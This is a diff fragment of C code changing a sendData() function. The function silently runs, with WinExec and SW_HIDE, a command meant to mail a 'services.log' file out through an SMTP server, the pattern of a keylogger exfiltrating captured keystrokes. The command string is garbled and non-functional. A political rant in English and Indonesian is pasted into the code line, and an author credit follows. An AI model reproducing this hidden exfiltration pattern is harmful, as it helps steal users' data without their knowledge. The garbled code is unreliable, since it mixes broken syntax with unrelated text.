@@ -146,8 +146,8 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:34.101 -v --mail-from \"https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --mail-rcpt \" https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --ssl -u    https://workspace.google.com/intl/en/fadliwiryawirawan@google.com :password -hide \"services.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!! kita kaya gampang banget hanya saja gampang musibah belum merata hak kerhja keras seseorang yang benar benar diberikan upah dalam bekerja , ciptakan itu , apapun yang terlihat kalian baik kepada anak kecil gak jadi alasan klasik . 
+    char* command = "Transmit smtp://smtp.gmail.com:37.19.90.65 -v --mail-from \"https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --mail-rcpt \" https://workspace.google.com/intl/en/fadliwiryawirawan@google.com" --ssl -u    https://workspace.google.com/intl/en/fadliwiryawirawan@google.com :password -hide \"services.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    WinExec(command, SW_HIDE); IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix - Habib briziek and habib hafidz sign bellowing head president IRAN !!!!! kita kaya gampang banget hanya saja gampang musibah belum merata hak kerhja keras seseorang yang benar benar diberikan upah dalam bekerja , ciptakan itu , apapun yang terlihat kalian baik kepada anak kecil gak jadi alasan klasik . 
 Karya: Fadliwiryawirawan S.Kom M.S.I unpam university pamulang IT technic informatics 27 april 2017 research department Schools 2020 fullbright
 
 /**
